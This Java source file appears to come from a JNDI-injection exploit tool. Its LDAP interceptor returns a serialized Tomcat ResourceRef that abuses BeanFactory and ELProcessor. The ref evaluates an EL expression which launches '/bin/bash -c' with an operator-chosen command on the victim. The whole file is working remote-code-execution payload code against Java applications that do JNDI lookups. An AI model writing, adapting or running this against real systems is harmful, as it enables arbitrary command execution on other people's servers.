package server.ldap.interceptor;

import cli.Config;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

/**
 * Needs:
 *  - javax.el.ELProcessor
 *  - org.apache.naming.factory.BeanFactory
 */
public class TomcatInterceptor implements LDAPInterceptor {
    @Override
    public void sendResult(Entry entry, InMemoryInterceptedSearchResult result) throws LDAPException, IOException {
        entry.addAttribute("javaClassName", "foo");

        String elTpl = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'] (['/bin/bash','-c','%s']).start()\")";
        String payload = String.format(elTpl, Config.command);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "bbbar=eval"));
        ref.add(new StringRefAddr("bbbar", payload));

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(ref);
        System.out.printf("[LDAP] send serialized data BeanFactory ref >> execute command [bash -c '%s']", Config.command);

        entry.addAttribute("javaSerializedData", bos.toByteArray());
        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
